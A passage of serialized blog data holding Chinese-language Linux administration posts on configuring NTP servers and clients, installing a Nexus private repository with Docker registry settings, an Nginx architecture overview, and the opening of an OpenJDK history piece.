class=\"code\"><pre><span class=\"line\">[root@localhost ~]# systemctl enable ntpd --now</span><br><span class=\"line\">Created symlink from /etc/systemd/system/multi-user.target.wants/ntpd.service to /usr/lib/systemd/system/ntpd.service.</span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost ~]# systemctl status ntpd</span><br><span class=\"line\">● ntpd.service - Network Time Service</span><br><span class=\"line\">Loaded: loaded (/usr/lib/systemd/system/ntpd.service; enabled; vendor preset: disabled)</span><br><span class=\"line\">Active: active (running) since 日 2021-11-07 13:31:53 CST; 1min 21s ago</span><br><span class=\"line\">Process: 8715 ExecStart=/usr/sbin/ntpd -u ntp:ntp $OPTIONS (code=exited, status=0/SUCCESS)</span><br><span class=\"line\">Main PID: 8716 (ntpd)</span><br><span class=\"line\">CGroup: /system.slice/ntpd.service</span><br><span class=\"line\">        └─8716 /usr/sbin/ntpd -u ntp:ntp -g</span><br><span class=\"line\"></span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listen normally on 2 lo 127.0.0.1 UDP 123</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listen normally on 3 eth0 192.168.0.54 UDP 123</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listen normally on 4 eth0 192.168.0.140 UDP 123</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listen normally on 5 lo ::1 UDP 123</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listen normally on 6 eth0 fe80::8f4f:d214:efbc:f83d UDP 123</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: Listening on routing socket on fd #23 for interface updates</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: 0.0.0.0 c016 06 restart</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: 0.0.0.0 c012 02 freq_set kernel 0.000 PPM</span><br><span class=\"line\">11月 07 13:31:53 localhost.localdomain ntpd[8716]: 0.0.0.0 c011 01 freq_not_set</span><br><span class=\"line\">11月 07 13:31:56 localhost.localdomain ntpd[8716]: 0.0.0.0 c514 04 freq_mode</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>ntpq -np</code> 和 <code>ntpstat</code>命令检查NTP运行状态</p>\n <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]# netstat -tunpl</span><br><span class=\"line\">Active Internet connections (only servers)</span><br><span class=\"line\">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class=\"line\">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1045/master         </span><br><span class=\"line\">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1117/sshd           </span><br><span class=\"line\">tcp6       0      0 ::1:25                  :::*                    LISTEN      1045/master         </span><br><span class=\"line\">tcp6       0      0 :::22                   :::*                    LISTEN      1117/sshd           </span><br><span class=\"line\">udp        0      0 192.168.0.140:123       0.0.0.0:*                           1289/ntpd           </span><br><span class=\"line\">udp        0      0 127.0.0.1:123           0.0.0.0:*                           1289/ntpd           </span><br><span class=\"line\">udp        0      0 0.0.0.0:123             0.0.0.0:*                           1289/ntpd           </span><br><span class=\"line\">udp6       0      0 fe80::6c3c:5cff:fee:123 :::*                                1289/ntpd           </span><br><span class=\"line\">udp6       0      0 ::1:123                 :::*                                1289/ntpd           </span><br><span class=\"line\">udp6       0      0 :::123                  :::*                                1289/ntpd  </span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost ~]# ntpstat</span><br><span class=\"line\">synchronised to local net (127.127.1.0) at stratum 11</span><br><span class=\"line\">time correct to within 7948 ms</span><br><span class=\"line\">polling server every 64 s</span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost ~]# ntpq -np</span><br><span class=\"line\">    remote           refid      st t when poll reach   delay   offset  jitter</span><br><span class=\"line\">==============================================================================</span><br><span class=\"line\">*ntp.ntsc.ac.cn  .OLEG.           1 u    5   64  337    7.459   26.113  15.259</span><br><span class=\"line\">+120.25.115.20   10.137.53.7      2 u    1   64  373   41.897   23.154   8.982</span><br><span class=\"line\">+124.108.20.1    216.218.254.202  2 u    4   64  377  194.241   31.783   7.919</span><br><span class=\"line\">LOCAL(0)        .LOCL.          10 l  144   64  374    0.000    0.000   0.000</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>NTP服务器的状态，其中： * 代表当前主用站点，+ 代表优先站点， - 代表备用站点。</p>\n</blockquote>\n</li>\n</ol>\n<hr>\n<h2 id=\"NTP-Client-的设置方法\"><a href=\"#NTP-Client-的设置方法\" class=\"headerlink\" title=\"NTP Client 的设置方法\"></a>NTP Client 的设置方法</h2><ol>\n<li><p>安装NTP软件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install -y ntp</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编辑NTP配置文件，位于<code>/etc/ntp.conf</code>。 删除默认内容，加入内网NTP服务器地址</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/ntp.conf &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\"># 设置内网NTP服务器地址</span></span><br><span class=\"line\"><span class=\"string\">server 192.168.0.140</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#允许时间服务器(上游时间服务器)修改本机时间</span></span><br><span class=\"line\"><span class=\"string\">restrict 192.168.0.140 nomodify notrap noquery</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置系统启动服务，并检查运行状态</p>\n <figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]# systemctl enable ntpd --now</span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost ~]# ntpq -p</span><br><span class=\"line\"> remote           refid      st t when poll reach   delay   offset  jitter</span><br><span class=\"line\">==============================================================================</span><br><span class=\"line\">*192.168.0.140   114.118.7.161    2 u    4   64   77    0.320    0.022   0.027</span><br></pre></td></tr></table></figure></li>\n</ol>\n<blockquote>\n<p>由于NTP服务占用系统端口123，可能被FireWalld防火墙封堵，如果无法同步时，注意检查防火墙</p>\n</blockquote>\n<h2 id=\"分析：ntpd-Vs-ntpdate\"><a href=\"#分析：ntpd-Vs-ntpdate\" class=\"headerlink\" title=\"分析：ntpd Vs ntpdate\"></a>分析：ntpd Vs ntpdate</h2><ul>\n<li><code>ntpd</code>    :在实际同步时间时是一点点的校准过来时间的，最终把时间慢慢的校正对（平滑同步）</li>\n<li><code>ntpdate</code> :不会考虑其他程序是否会阵痛，直接调整时间（“跃变”）。</li>\n</ul>\n<p>换句话说，ntpd是校准时间，ntpdate是调整时间。</p>\n<p>注意，系统后台服务只能采用<code>ntpd</code>，这是因为，<code>ntpdate</code>的跃变模式存在较大的系统风险，包括：</p>\n<ol>\n<li><strong>不安全</strong>。ntpdate 的设置依赖于 ntp 服务器的安全性，攻击者可以利用一些软件设计上的缺陷，拿下 ntp 服务器并令与其同步的服务器执行某些消耗性的任务。由于 ntpdate 采用的方式是跳变，跟随它的服务器无法知道是否发生了异常（时间不一样的时候，唯一的办法是以服务器为准）。</li>\n<li><strong>不精确</strong>。一旦 ntp 服务器宕机，跟随它的服务器也就会无法同步时间。与此不同，ntpd 不仅能够校准计算机的时间，而且能够校准计算机的时钟。</li>\n<li><strong>不优雅</strong>。由于是跳变，而不是使时间变快或变慢，依赖时序的程序会出错（例如，如果 ntpdate 发现你的时间快了，则可能会经历两个相同的时刻，对某些应用而言，这是致命的）。</li>\n</ol>\n<p>因而，使用ntpdate一般由系统管理员在刚刚启动，没有业务负荷时手工操作来校准时间。</p>\n<hr>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://cloud.tencent.com/document/product/213/30393\">配置 NTP 服务 - 腾讯云</a></li>\n<li><a href=\"https://www.jianshu.com/p/8b4befdd9196\">快速部署ntp时间服务器</a></li>\n<li><a href=\"https://blog.51cto.com/wolfgang/1127162\">NTP时间服务器配置详解</a></li>\n<li><a href=\"https://huataihuang.gitbooks.io/cloud-atlas/content/service/ntp/ntpq_timed_out_nothing_received.html\">ntpq: read: Connection refused 疑难问题排查</a></li>\n</ul>\n"},{"title":"Nexus私有仓库的安装日志","url":"/2021/02/14/Nexus%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%E7%9A%84%E5%AE%89%E8%A3%85%E6%97%A5%E5%BF%97/","content":"<h2 id=\"Nexus简介\"><a href=\"#Nexus简介\" class=\"headerlink\" title=\"Nexus简介\"></a>Nexus简介</h2><p>Nexus是一个强大的Maven仓库管理器，它极大地简化了本地内部仓库的维护和外部仓库的访问。 如果使用了公共的Maven仓库服务器，可以从Maven中央仓库下载所需要的构件（Artifact），但这通常不是一个好的做法。<br>正常做法是在本地架设一个Maven仓库服务器，即利用Nexus可以只在一个地方就能够完全控制访问和部署在你所维护仓库中的每个Artifact。 Nexus在代理远程仓库的同时维护本地仓库，以降低中央仓库的负荷,节省外网带宽和时间，Nexus就可以满足这样的需要。<br>Nexus是一套“开箱即用”的系统不需要数据库，它使用文件系统加Lucene来组织数据。<br>Nexus使用ExtJS来开发界面，利用Restlet来提供完整的REST APIs，通过m2eclipse与Eclipse集成使用。<br>Nexus支持WebDAV与LDAP安全身份认证。<br>Nexus还提供了强大的仓库管理功能，构件搜索功能，它基于REST，友好的UI是一个extjs的REST客户端，它占用较少的内存，基于简单文件系统而非数据库。</p>\n<hr>\n<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><p>必须的硬件条件：</p>\n<ul>\n<li>内存 &gt; 4GB</li>\n<li>可用磁盘空间 &gt; 4GB (建议独立数据磁盘，32G以上）</li>\n<li>已安装JDK8（Maven不是必须的）</li>\n</ul>\n<blockquote>\n<p>Sonatype官方文档宣称必须使用Oracle JDK，但OpenJDK似乎也没问题，但不支持JDK9以上版本</p>\n</blockquote>\n<h2 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h2><ol>\n<li><p>下载nexus软件包，当前版本<code>3.29.2</code>，安装包解压后有两个目录：</p>\n<ul>\n<li>程序目录<code>./nexus-3.29.2-02/</code>， 改名后迁移到&#x2F;opt</li>\n<li>工作目录<code>./sonatype-work/nexus</code>，注意包含子目录，根据需要迁移或直接挂载数据盘</li>\n</ul>\n<blockquote>\n<p>也可以采用docker部署，镜像位于<code>sonatype/nexus3:3.29.2</code>，run可以设置port、volume</p>\n</blockquote>\n</li>\n<li><p>创建nexus用户，并设置文件权限</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 新建nexus用户及用户组，nexus3不允许root启动</span></span><br><span class=\"line\">groupadd nexus</span><br><span class=\"line\">useradd -d /home/nexus -g nexus nexus</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将代码目录和数据目录赋权给nexus</span></span><br><span class=\"line\"><span class=\"built_in\">chown</span> -R nexus:nexus /opt/nexus</span><br><span class=\"line\"><span class=\"built_in\">chown</span> -R nexus:nexus /opt/sonatype-work</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置NEXUS环境变量，编辑文件<code>/etc/profile.d/nexus.sh</code></p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">NEXUS_HOME=/opt/nexus/</span><br><span class=\"line\">PATH=$NEXUS_HOME/bin:$PATH</span><br><span class=\"line\">export PATH NEXUS_HOME</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>直接<code>cat</code>时，由于$语义替换会出错</p>\n</blockquote>\n</li>\n<li><p>为Nexus设置运行用户名，编辑<code>/opt/nexus/bin/nexus.rc</code><br>并设置<code>run_as_user=&quot;nexus&quot;</code></p>\n</li>\n<li><p>设置系统自启动服务，创建&#96;&#96;，并填写</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /usr/lib/systemd/system/nexus.service &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[Unit]</span></span><br><span class=\"line\"><span class=\"string\">Description=Nexus daemon</span></span><br><span class=\"line\"><span class=\"string\">After=network.target</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[Service]</span></span><br><span class=\"line\"><span class=\"string\">Type=forking</span></span><br><span class=\"line\"><span class=\"string\">LimitNOFILE=65536</span></span><br><span class=\"line\"><span class=\"string\">ExecStart=/opt/nexus/bin/nexus start</span></span><br><span class=\"line\"><span class=\"string\">ExecStop=/opt/nexus/bin/nexus stop</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">User=nexus</span></span><br><span class=\"line\"><span class=\"string\">Restart=on-abort</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[Install]</span></span><br><span class=\"line\"><span class=\"string\">WantedBy=multi-user.target</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<p> 然后就是常规操作</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> --now nexus</span><br><span class=\"line\">systemctl status nexus</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"NEXUS仓库设置\"><a href=\"#NEXUS仓库设置\" class=\"headerlink\" title=\"NEXUS仓库设置\"></a>NEXUS仓库设置</h2><p>通过浏览器访问<a href=\"http://192.168.0.147:8081/\">http://192.168.0.147:8081</a></p>\n<p>初次访问登录时，需要设置admin的密码，初始密码在<code>/opt/sonatype-work/nexus3/admin.xxxx</code>文件中，一般设为<code>admin123</code>。</p>\n<p>然后，就可以根据需要设置各类私服仓库了。</p>\n<ol>\n<li>设置docker-proxy</li>\n<li>设置docker-group</li>\n<li>设置Realms权限</li>\n</ol>\n<h2 id=\"Client使用方法\"><a href=\"#Client使用方法\" class=\"headerlink\" title=\"Client使用方法\"></a>Client使用方法</h2><ol>\n<li>设置insecure-registries</li>\n<li>设置registry-mirrors</li>\n<li>重启docker服务</li>\n</ol>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@<span class=\"built_in\">test</span> ~]<span class=\"comment\"># more /etc/docker/daemon.json</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;insecure-registries&quot;</span>:[</span><br><span class=\"line\">        <span class=\"string\">&quot;192.168.0.147:9001&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;192.168.0.149&quot;</span></span><br><span class=\"line\">    ],</span><br><span class=\"line\">    <span class=\"string\">&quot;registry-mirrors&quot;</span>: [</span><br><span class=\"line\">        <span class=\"string\">&quot;http://192.168.0.147:9001&quot;</span></span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>待续…</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://godleon.github.io/blog/Nexus_Repository/docker-configure-proxy-with-nexus/\">安裝 Nexus Repository Manager 作為 Docker Hub Mirror &amp; Docker Image Proxy</a></li>\n<li><a href=\"https://www.0x0f0f.com/docker/create-docker-repository-in-nexus/create-docker-repository-in-nexus/\">Nexus上配置Docker仓库</a></li>\n<li><a href=\"https://jenkins-zh.cn/wechat/articles/2020/05/2020-05-13-using-nexus-oss-as-a-proxy-cache-for-docker-images/\">使用 Nexus OSS 为 Docker 镜像提供代理&#x2F;缓存功能</a></li>\n<li><a href=\"https://wiki.jikexueyuan.com/project/linux-in-eye-of-java/Nexus-Install-And-Settings.html\">Nexus 安装和配置</a></li>\n<li><a href=\"https://www.xncoding.com/2017/09/02/tool/nexus.html\">maven私服nexus3.x环境配置</a></li>\n<li><a href=\"https://qizhanming.com/blog/2017/05/16/how-to-install-sonatype-nexus-oss-33-on-centos-7\">CentOS 7 下安装和配置 Sonatype Nexus 3.3</a></li>\n<li><a href=\"https://www.cnblogs.com/blaketairan/p/7136735.html\">maven私服 nexus2.x工作目录解读</a></li>\n<li><a href=\"https://juejin.cn/post/6844903781654593550\">使用harbor和nexus作为docker registry</a></li>\n<li><a href=\"https://blog.csdn.net/wq6ylg08/article/details/91351339\">Java版本号解读</a></li>\n</ul>\n"},{"title":"Nginx 安装和配置方法","url":"/2022/04/23/Nginx-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/","content":"<p>nginx（发音为“engine x”）是一个免费的开源 Web 服务器，由俄罗斯软件工程师 Igor Sysoev 编写。自 2004 年公开推出以来，nginx 一直专注于高性能、高并发和低内存使用。Web 服务器功能之上的附加功能，如负载平衡、缓存、访问和带宽控制，以及与各种应用程序有效集成的能力，有助于使 nginx 成为现代网站架构的理想选择。目前 nginx 是 Internet 上第二受欢迎的开源 Web 服务器。</p>\n<h2 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h2><p>如前所述，nginx 代码库由一个核心和许多模块组成。nginx的核心负责提供web服务器、web和邮件反向代理功能的基础；它支持使用底层网络协议，构建必要的运行时环境，并确保不同模块之间的无缝交互。但是，大多数特定于协议和应用程序的功能是由 nginx 模块完成的，而不是核心。</p>\n<p>在内部，nginx 通过管道或模块链处理连接。换句话说，对于每一个操作，都有一个模块在做相关的工作；例如，压缩、修改内容、执行服务器端包含、通过 FastCGI 或 uwsgi 协议与上游应用程序服务器通信，或与 memcached 通信。</p>\n<p>有几个 nginx 模块位于核心和真正的“功能”模块之间。这些模块是 http和mail。这两个模块在核心组件和低级组件之间提供了额外的抽象级别。在这些模块中，实现了对与相应应用层协议（如 HTTP、SMTP 或 IMAP）相关联的事件序列的处理。结合nginx核心，这些上层模块负责维护对各个功能模块的正确调用顺序。虽然 HTTP 协议目前作为http模块的一部分实现，但由于需要支持 SPDY 等其他协议（请参阅“SPDY：更快网络的实验性协议“）。</p>\n<p>功能模块可以分为事件模块、阶段处理程序、输出过滤器、变量处理程序、协议、上游和负载均衡器。尽管事件模块和协议也用于mail. 事件模块提供特定的操作系统相关的事件通知机制，如kqueue或epoll。nginx 使用的事件模块取决于操作系统的能力和构建配置。协议模块允许 nginx 通过 HTTPS、TLS&#x2F;SSL、SMTP、POP3 和 IMAP 进行通信。</p>\n<p><img src=\"/2022/04/23/Nginx-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95/architecture.png\" alt=\"Nginx 技术架构\"></p>\n<h2 id=\"安装方法\"><a href=\"#安装方法\" class=\"headerlink\" title=\"安装方法\"></a>安装方法</h2><h2 id=\"配置文件-etc-nginx-nginx-conf\"><a href=\"#配置文件-etc-nginx-nginx-conf\" class=\"headerlink\" title=\"配置文件 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf\"></a>配置文件 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</h2><p>nginx 配置保存在许多纯文本文件中，这些文件通常位于<code>/etc/nginx/</code>或 <code>/etc/local/nginx/</code>. 主配置文件通常称为 <code>nginx.conf</code>. 为了保持整洁，部分配置可以放在单独的文件中，这些文件可以自动包含在主文件中。所有与 nginx Web 服务器行为相关的配置都应该驻留在一组集中的配置文件中。</p>\n<p>配置文件最初由主进程读取和验证。nginx 配置的编译只读形式可供worker进程使用，因为它们是从主进程派生的。配置结构由通常的虚拟内存管理机制自动共享。</p>\n<p>nginx 配置有几个不同的上下文用于main, http, server, upstream, location（也 mail用于邮件代理）指令块。上下文永远不会重叠。例如，没有将 location块放在main指令块中这样的事情。此外，为了避免不必要的歧义，没有像“全局 Web 服务器”配置这样的东西。nginx 配置旨在简洁且符合逻辑，允许用户维护包含数千条指令的复杂配置文件。在一次私人谈话中，Sysoev 说，“全局服务器配置中的位置、目录和其他块是我在 Apache 中不喜欢的功能，所以这就是为什么它们从未在 nginx 中实现的原因。”</p>\n<p>配置语法、格式和定义遵循所谓的 C 风格约定。这种制作配置文件的特殊方法已经被各种开源和商业软件应用程序使用。根据设计，C 风格的配置非常适合嵌套描述，具有逻辑性并且易于创建、阅读和维护，并且受到许多工程师的喜爱。nginx 的 C 风格配置也可以很容易地自动化。</p>\n<p>配置文件最初由主进程读取和验证。nginx 配置的编译只读形式可供worker进程使用，因为它们是从主进程派生的。配置结构由通常的虚拟内存管理机制自动共享。</p>\n<p>nginx 配置有几个不同的上下文用于main, http, server, upstream, location（也 mail用于邮件代理）指令块。上下文永远不会重叠。例如，没有将 location块放在main指令块中这样的事情。此外，为了避免不必要的歧义，没有像“全局 Web 服务器”配置这样的东西。nginx 配置旨在简洁且符合逻辑，允许用户维护包含数千条指令的复杂配置文件。在一次私人谈话中，Sysoev 说，“全局服务器配置中的位置、目录和其他块是我在 Apache 中不喜欢的功能，所以这就是为什么它们从未在 nginx 中实现的原因。”</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"http://nginx.org/en/download.html\">Nginx 官方下载</a></li>\n<li><a href=\"http://nginx.org/en/docs/\">Nginx 官方文档</a></li>\n<li><a href=\"https://www.zhukun.net/archives/7343\">安装Nginx + FancyIndex插件</a></li>\n<li><a href=\"https://www.24kplus.com/others/1770.html\">解决 Can’t open PID file &#x2F;var&#x2F;run&#x2F;nginx.pid (yet?) after start: No such file or directory 错误</a></li>\n</ul>\n"},{"title":"OpenJDK的技术概述","url":"/2021/11/21/OpenJDK%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>1995年，Sun公司正式发布了Java语言，并建立了<code>JCP（Java Community Process）</code>开源社区，负责管理Java技术标准。<br><code>JSR（Java Specification Requests）</code>是JCP发布的技术规范，由拥有投票权的JCP成员集体投票决定。</p>\n<p>为了开发和运行Java应用软件，必须为用户提供一个完整的开发套件，这就是<code>JDK</code>（Java Development Kit），包含了编译器、软件库和Java虚拟机等核心组件。1999年之后，Sun公司发布了多个版本的JDK产品，主要包括：</p>\n<ul>\n<li><code>J2SE</code>：Java Platform Standard Edition，标准版的Java平台。目标是工作站等标准应用，也是最常见的</li>\n<li><code>J2EE</code>：Java Platform Enterprise Edition，企业版的Java平台。目标是企业级应用，通常是收费的</li>\n<li><code>J2ME</code>：Java Platform Micro Edition，微型版的Java平台。目标是手机、游戏机等移动设备、嵌入式设备，但由于Android的发展已被淘汰</li>\n<li><code>Java Card</code>：广泛运用在SIM卡、提款卡上，以具有安全防护性的方式来执行小型的Java Applet</li>\n</ul>\n<blockquote>\n<p>2010年，Oracle收购Sun以后，<code>J2SE</code>也被称为<code>Oralce JDK</code>，而JCP董事会也受到广泛批评，被称为“Oracle的橡皮图章”。</p>\n</blockquote>\n<h2 id=\"JDK-JRE-JVM\"><a href=\"#JDK-JRE-JVM\" class=\"headerlink\" title=\"JDK &amp; JRE &amp; JVM\"></a>JDK &amp; JRE &amp; JVM</h2><p>Java的技术理念是“<strong>一次编译，到处运行</strong>”，核心特性就是跨平台，必须通过<code>JRE</code>(Java Runtime Enviroment)解决平台适配问题。<br><code>JRE</code>就是运行Java程序所必须环境的集合，面向Java程序的使用者，而不是开发者。因此，如果你仅下载并安装了JRE，那么你的系统只能运行Java程序，但无法进行开发。</p>\n<p>以Oracle JDK为例，其技术架构参见<a href=\"https://docs.oracle.com/javase/8/docs/index.html\">Java SE Platform at a Glance</a>，而JRE仅仅是<strong>不包含开发工具</strong>。</p>\n<img src=\"/2021/11/21/OpenJDK%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/j2se.png\" class=\"\">\n\n<h3 id=\"1-开发工具（Tools-Tool-APIs）\"><a href=\"#1-开发工具（Tools-Tool-APIs）\" class=\"headerlink\" title=\"1. 开发工具（Tools &amp; Tool APIs）\"></a>1. 开发工具（Tools &amp; Tool APIs）</h3><p>开发工具仅在<code>JDK</code>中提供，具体包括编译器javac、解释器交互工具java、打包工具jar等。<br>由于<code>JRE</code>不包含此部分，因此只能用于部署生产环境，无法支持开发。</p>\n<h3 id=\"2-核心类和支持库文件（Java-SE-API）\"><a href=\"#2-核心类和支持库文件（Java-SE-API）\" class=\"headerlink\" title=\"2. 核心类和支持库文件（Java SE API）\"></a>2. 核心类和支持库文件（Java SE API）</h3><ul>\n<li>Integration Libraries：集成库文件，包括数据库连接JDBC、CORBA接口IDL、名字和目录服务JNDI等</li>\n<li>Other Base Libraries：其他基础库文件，包括XML解析器、网络接口、JSON序列化、日期时间函数等</li>\n<li>Base Libraries：核心库文件。包括基础类定义、数学计算、反射等动态语言特性、日志等监控功能</li>\n</ul>\n<p>此外，由于浏览器技术的快速发展，Java主要被用于后台服务处理，以下组件实际上很少使用，基本被淘汰</p>\n<ul>\n<li>Deployment：用于开发浏览器脚本和插件等，后来出现了替代开源项目IcedTea，但均未成为行业主流</li>\n<li>User Interface Toolkits：GUI工具，但由于浏览器技术的快速发展，java，未成为行业主流</li>\n</ul>\n<h3 id=\"3-虚拟机（Java-Virtuanl-Machine）\"><a href=\"#3-虚拟机（Java-Virtuanl-Machine）\" class=\"headerlink\" title=\"3. 虚拟机（Java Virtuanl Machine）\"></a>3. 虚拟机（Java Virtuanl Machine）</h3><p>Java虚拟机是JRE的核心引擎，它支持不同的平台，如Intel 32位和64位架构，ARM架构和SPARC等。<br>Oracle JDK使用<code>HotSpot</code>作为默认引擎，用于解释并执行字节码。<br>BEA公司开发了<code>JRockit</code>引擎，特点是使用纯编译的执行引擎，没有解释器。随着被Oracle收购，从JDK 8已经被融合到<code>HotSpot</code>。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">bogon:~ sj$ java -version</span><br><span class=\"line\">java version &quot;15.0.2&quot; 2021-01-19</span><br><span class=\"line\">Java(TM) SE Runtime Environment (build 15.0.2+7-27)</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM (build 15.0.2+7-27, mixed mode, sharing)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"结论：JDK-Java虚拟机-Runtime类库-编译器等开发工具包\"><a href=\"#结论：JDK-Java虚拟机-Runtime类库-编译器等开发工具包\" class=\"headerlink\" title=\"结论：JDK &#x3D; Java虚拟机 + Runtime类库 + 编译器等开发工具包\"></a>结论：JDK &#x3D; Java虚拟机 + Runtime类库 + 编译器等开发工具包</h3><img src=\"/2021/11/21/OpenJDK%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/JDK-2.png\" class=\"\">\n\n<h2 id=\"OpenJDK-Community-OpenJDK的诞生\"><a href=\"#OpenJDK-Community-OpenJDK的诞生\" class=\"headerlink\" title=\"OpenJDK Community - OpenJDK的诞生\"></a>OpenJDK Community - OpenJDK的诞生</h2><p>2005年，Sun公司发布了Java语言和Java SE，虽然通过“Sun社群代码许可”（Sun Community Source License），源代码可以免费使用。但是，使用了Java源代码的程序必须遵守Java的编程规范，商业性改编程序必须要得到Sun的许可。</p>\n<p>2006年，为了缓解IT行业的巨大压力，Sun公司牵头组建了开源社区<code>OpenJDK Community</code>，初始源代码采用GPL v2许可证。</p>\n<p>2007年，Sun公司正式发布了开源版的Java开发组件（OpenJDK），作为Java SE 6的开源和免费实现，并根据<code>GNU GPL</code>许可证授权，向开发人员开放了创作改编程序所必要的权限，并赋予其在不同许可下发布应用程序的能力。</p>\n<p>目前，OpenJDK社区包含了大量Project项目，例如：</p>\n<ul>\n<li>JDK 6-9：基于JSR 270（Java SE 6 Release Contents），构建Jave SE 6的开源实现，7-9版本类似</li>\n<li>OpenJDK：这是最重要的项目，负责构建OpenJDK 10-18版本的开源技术实现。由于自JDK 10开始，Oracle JDK与OpenJDK实现了融合，该项目产出的OpenJDK直接成为了Java SE的官方参考实现，因此不再为每个版本单独设立项目，OpenJDK 18是当前最新的开发版本。</li>\n<li>Graal：源于SUN公司的<code>Maxine VM</code>项目，采用高度优化的JIT编译器。2012年从OpenJDK项目中剥离出来，并在JDK 10中纳入实验性功能</li>\n<li>IcedTea：最初是由于OpenJDK不完整（例如个别字体库由于许可证差异而无法提供）而创立的，为社区提供必要的开源工具链及代码库。它有一个基于<code>./configure</code>的不同的构建系统，正是由于IcedTea的努力，许多第三方发行版大大减少了使用补丁的数量</li>\n</ul>\n<p><code>OpenJDK Project</code> 项目组成员包括Oracle、IBM、Alibaba，Amazon、Azul、Google，Huawei，Intel、Microsoft等几乎所有主流IT公司，使用C++和Java编程语言开发。</p>\n<p>没错，从 Java SE 7开始往后的版本，连大名鼎鼎的 Oracle JDK 都是根据 Open JDK 做出来的 (修改了一些功能的实现方式，再打上自己的商标并提供配套服务)。或者应该说自 Java SE 7开始往后的版本，所有的 JDK 都源自于 Open JDK (OpenJDK 与 其他 JDK 的关系就和 Linux 与它的众多发行版是一样一样的)。</p>\n<h2 id=\"OpenJDK-Vs-Oracle-JDK\"><a href=\"#OpenJDK-Vs-Oracle-JDK\" class=\"headerlink\" 